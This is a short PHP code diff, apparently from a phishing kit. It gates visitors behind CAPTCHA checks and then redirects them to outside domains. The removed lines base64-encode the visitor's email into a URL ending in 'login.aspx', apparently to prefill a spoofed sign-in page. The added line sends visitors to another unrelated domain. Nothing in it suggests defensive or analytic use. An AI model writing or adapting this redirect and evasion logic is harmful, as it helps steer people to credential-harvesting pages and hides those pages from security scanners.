@@ -41,15 +41,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     if ($captchaSuccess->success) {
         // Both CAPTCHAs passed, proceed with further processing
-
-        // Encode the email address in Base64
-        $encodedEmail = base64_encode($email);
-
-        // Construct the redirect URL with the encoded email
-        $redirectUrl = "https://orange-ground-01fdf2b1e.5.azurestaticapps.net/auth/v/?id=abc123XYZ4567890/message?data=($encodedEmail)/login.aspx";
-
-        // Redirect the user
-        header("Location: $redirectUrl");
+        header("Location: https://distribpalmas.com/s2wP/#X");
         exit();
     } else {
         echo "Turnstile CAPTCHA validation failed. Please try again.";
